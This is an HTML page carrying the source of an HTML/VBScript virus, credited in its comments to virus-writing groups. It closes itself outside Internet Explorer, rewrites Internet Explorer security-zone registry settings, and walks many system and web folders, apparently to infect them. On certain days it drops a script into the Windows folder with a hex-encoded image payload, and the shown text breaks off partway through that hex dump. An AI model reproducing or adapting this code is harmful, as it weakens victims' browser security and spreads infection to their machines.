<!--Charmander-->
<HTML>
<BODY>
<SCRIPT Language = "JavaScript">
<!--
	var userAgent=navigator.appName;
	var agentInfo=userAgent.substring(0, 1);
    if(agentInfo == "M"){
}
else {
alert("The page you want to view was designed for Internet Explorer only, \n Please view this page with Internet Explorer")
self.close()
}
//-->
</SCRIPT>

<Script Language = "VBScript">
<!--
On Error Resume Next
'HTML.Charmander.a
'By -KD- [Metaphase VX Team & NoMercyVirusTeam]
'Technology used from foxz [NoMercyVirusTeam]
'Part of the HTML Pokemon Family
'This Family goes out to IDT
Set WshShell = CreateObject("WScript.Shell")
WshShell.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201", 0, "REG_DWORD"
If location.protocol = "file:" then
  Randomize
  Set TRange = document.body.createTextRange()
  HPath = Replace(location.href, "/", "\")
  Set FSO = CreateObject("Scripting.FileSystemObject")
  HPath = Replace(HPath, "file:\\\", "")
  HPath = FSO.GetParentFolderName(HPath)
  Call GetFolder(HPath)
  Call GetFolder("C:\")
  Call GetFolder("C:\My Documents")
  Call GetFolder("C:\Windows")
  Call GetFolder("C:\Windows\System")
  Call GetFolder("C:\Windows\ShellNew")
  Call GetFolder("C:\Windows\Help")
  Call GetFolder("C:\Windows\Temp")
  Call GetFolder("C:\Windows\Web")
  Call GetFolder("C:\Windows\Web\Wallpaper")
  Call GetFolder("C:\Program Files\Microsoft Office\Office\Headers")
  Call GetFolder("C:\Inetpub\wwwroot")
  Call GetFolder("C:\Inetpub\wwwroot\myweb")
  Call GetFolder("C:\Program Files\Internet Explorer\Connection Wizard")
  Call GetFolder("C:\Program Files\Microsoft FrontPage\bin")	
End If
If Day(Now()) = 5 or Day(Now()) = 15 or Day(Now()) = 20  Then
  Set DropCharmander = FSO.CreateTextFile("c:\Windows\pokemon.dll", 2, False)
  DropCharmander.WriteLine "n Charman.jpg"
  DropCharmander.WriteLine "e 0100 ff d8 ff e0 00 10 4a 46 49 46 00 01 01 01 00 48 "
  DropCharmander.WriteLine "e 0110 00 48 00 00 ff db 00 43 00 0f 0a 0b 0d 0b 09 0f "
  DropCharmander.WriteLine "e 0120 0d 0c 0d 11 10 0f 11 16 25 18 16 14 14 16 2d 20 "
  DropCharmander.WriteLine "e 0130 22 1b 25 35 2f 38 37 34 2f 34 33 3b 42 55 48 3b "
  DropCharmander.WriteLine "e 0140 3f 50 3f 33 34 4a 64 4b 50 57 5a 5f 60 5f 39 47 "
  DropCharmander.WriteLine "e 0150 68 6f 67 5c 6e 55 5d 5f 5b ff db 00 43 01 10 11 "
  DropCharmander.WriteLine "e 0160 11 16 13 16 2b 18 18 2b 5b 3d 34 3d 5b 5b 5b 5b "
  DropCharmander.WriteLine "e 0170 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b "
  DropCharmander.WriteLine "e 0180 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b "
  DropCharmander.WriteLine "e 0190 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b 5b ff c0 "
  DropCharmander.WriteLine "e 01a0 00 11 08 00 60 00 6c 03 01 22 00 02 11 01 03 11 "
  DropCharmander.WriteLine "e 01b0 01 ff c4 00 1a 00 00 02 03 01 01 00 00 00 00 00 "
  DropCharmander.WriteLine "e 01c0 00 00 00 00 00 00 04 05 02 03 06 01 00 ff c4 00 "
  DropCharmander.WriteLine "e 01d0 30 10 00 02 01 03 03 03 04 01 03 02 07 00 00 00 "
  DropCharmander.WriteLine "e 01e0 00 00 01 02 03 00 04 11 12 21 31 05 41 51 13 22 "
  DropCharmander.WriteLine "e 01f0 61 71 14 06 23 a1 32 81 24 33 42 52 62 91 92 ff "
  DropCharmander.WriteLine "e 0200 c4 00 19 01 00 03 01 01 01 00 00 00 00 00 00 00 "
  DropCharmander.WriteLine "e 0210 00 00 00 00 02 03 04 00 01 05 ff c4 00 1f 11 00 "
  DropCharmander.WriteLine "e 0220 03 01 01 00 03 01 01 01 01 00 00 00 00 00 00 00 "
  DropCharmander.WriteLine "e 0230 01 02 11 03 12 21 31 32 22 04 13 ff da 00 0c 03 "
  DropCharmander.WriteLine "e 0240 01 00 02 11 03 11 00 3f 00 cc 81 be e2 af 8e 39 "
  DropCharmander.WriteLine "e 0250 2e 0e 88 90 b1 f8 a8 85 f9 c5 3e e8 71 21 81 99 "
  DropCharmander.WriteLine "e 0260 79 5f ea 39 a9 6d f8 ad 29 e7 3e 55 82 e1 d2 6f "
  DropCharmander.WriteLine "e 0270 55 33 e9 af fe a8 39 16 48 98 ab a9 53 5b 03 c5 "
  DropCharmander.WriteLine "e 0280 23 eb 48 ab 16 b2 06 33 8f aa 9e 3b 55 56 15 74 "
  DropCharmander.WriteLine "e 0290 e1 33 3a 85 1c 6f 8d eb da 7b d7 b9 a2 6d ac 27 "
  DropCharmander.WriteLine "e 02a0 b8 ff 00 2d 70 a7 fd 47 8a a9 b4 96 b2 44 9b f4 "
  DropCharmander.WriteLine "e 02b0 81 8f c0 da b9 b7 8d a9 8c 9d 16 e5 54 b6 a4 6c "
  DropCharmander.WriteLine "e 02c0 76 19 a0 5e 26 89 8a c8 0a 91 42 aa 5f c6 76 a2 "
  DropCharmander.WriteLine "e 02d0 a7 ea 22 47 fd 57 06 33 5c ef 53 8e 45 88 ab 31 "
  DropCharmander.WriteLine "e 02e0 d8 11 9a 20 03 ac fa 54 b7 23 51 21 17 f9 35 3b "
  DropCharmander.WriteLine "e 02f0 be 8f 2c 0b ad 1b 5a 8e 47 7a 7b 6e a1 57 00 83 "
  DropCharmander.WriteLine "e 0300 8e e3 bd 4e 40 18 60 d4 75 da 95 61 7c 70 87 3a "
  DropCharmander.WriteLine "e 0310 63 b2 01 c9 07 6e d5 a2 b1 8a 33 6a 84 26 c7 cd "
  DropCharmander.WriteLine "e 0320 25 bc f4 9a fa 58 c3 0d 21 88 3b 53 8b 46 8a 2b "
  DropCharmander.WriteLine "e 0330 75 44 23 00 79 a7 74 af e5 68 8e 53 94 c4 24 36 "
  DropCharmander.WriteLine "e 0340 47 04 53 9e 89 04 b0 bc ce 5b f6 e5 c1 0b e0 d2 "
  DropCharmander.WriteLine "e 0350 82 c5 4f 18 a3 ad fa ab 46 34 b8 03 03 b7 7a 67 "
  DropCharmander.WriteLine "e 0360 5f 2f 1f 40 71 cf 2f 66 80 91 e6 92 f5 b8 5a e2 "
  DropCharmander.WriteLine "e 0370 1d 2a c4 60 ea db bd 75 ba a0 2b 9c 1a 11 67 b9 "
  DropCharmander.WriteLine "e 0380 ea 17 22 de d9 72 ef b7 d0 f3 51 c4 54 bd 2d e9 "
  DropCharmander.WriteLine "e 0390 d2 6a 70 1a d2 20 f7 01 64 00 28 e6 b5 16 d1 84 "
  DropCharmander.WriteLine "e 03a0 41 8d 87 8a cb ce 1e c6 60 ce 4b fa 53 29 62 a3 "
  DropCharmander.WriteLine "e 03b0 c1 ad 62 4b ea 8d 7f ee 19 e3 14 ee fe e3 74 4f "
  DropCharmander.WriteLine "e 03c0 f9 f1 56 61 d6 dd 4d 27 ea b0 23 46 ce 47 f4 f7 "
  DropCharmander.WriteLine "e 03d0 f1 4e 4f 06 93 f5 e9 4a 74 c9 d5 54 b1 60 17 6e "
  DropCharmander.WriteLine "e 03e0 db d4 dc bf 48 a7 b7 e0 47 8d b1 c8 ab 20 b7 17 "
  DropCharmander.WriteLine "e 03f0 19 8f 6c 1c 66 ab 0d 84 19 00 12 2b d1 19 35 8f "
  DropCharmander.WriteLine "e 0400 4f 39 3e 2b d2 69 a4 79 49 ad 35 96 da 63 8d 54 "
  DropCharmander.WriteLine "e 0410 1d 80 c5 4e 47 04 6c 47 d5 67 97 a8 4f 06 16 54 "
  DropCharmander.WriteLine "e 0420 61 e3 22 a4 fd 4d e4 3a 63 05 8f 85 19 35 05 73 "
  DropCharmander.WriteLine "e 0430 6d e9 e9 4f 44 96 15 5c 74 e6 fc 86 11 9d 9d 8b "
  DropCharmander.WriteLine "e 0440 1a b5 7a 55 d0 1e c7 52 3e aa d0 92 c3 73 0a bb "
  DropCharmander.WriteLine "e 0450 86 92 70 0e 33 9d 23 e6 b5 76 b0 a2 c0 a0 62 98 "
  DropCharmander.WriteLine "e 0460 ea b0 9f 25 3d 31 10 db 9b 99 40 8c 64 9e fe 29 "
  DropCharmander.WriteLine "e 0470 ed a7 4f 84 01 00 55 76 3f d5 9a 52 b7 f0 db ae "
  DropCharmander.WriteLine "e 0480 9b 54 c3 70 58 d3 ef d3 67 52 34 b2 1c b3 1e 68 "
  DropCharmander.WriteLine "e 0490 fa d5 3f 9f 0e 72 53 2b 5f d2 e6 fd 39 65 e9 92 "
  DropCharmander.WriteLine "e 04a0 f0 a6 af 81 4a 6e 6c d6 c6 41 a7 f6 fc 32 6d 8a "
  DropCharmander.WriteLine "e 04b0 d8 49 83 1d 67 ba d0 53 0b e3 90 36 a4 a4 f0 ce "
  DropCharmander.WriteLine "e 04c0 fd fb 12 c5 64 8f 39 d4 75 0c e4 e7 bd 3b 88 aa "
  DropCharmander.WriteLine "e 04d0 81 db 6a cc 2c f7 0a e1 86 fd b0 28 c8 ba 9b e7 "
  DropCharmander.WriteLine "e 04e0 4b 29 c8 e4 51 5c 53 5e c6 73 b8 4f 47 c6 45 c7 "
  DropCharmander.WriteLine "e 04f0 34 05 e2 a4 c8 ca 77 52 37 a0 e4 ea 63 4e dc fd "
  DropCharmander.WriteLine "e 0500 d0 92 dd cb 36 46 74 81 de 97 3c d8 db ea 9a 29 "
  DropCharmander.WriteLine "e 0510 92 dc 99 4a 46 72 07 f1 4d 2c ad a1 b5 8d 40 3a "
  DropCharmander.WriteLine "e 0520 a5 7e 49 a5 22 e2 68 83 08 9f 66 e4 e3 9a 33 a3 "
  DropCharmander.WriteLine "e 0530 36 bb e5 32 67 23 cd 55 4a dc 92 4d 42 ad 46 b2 "
  DropCharmander.WriteLine "e 0540 ca c1 0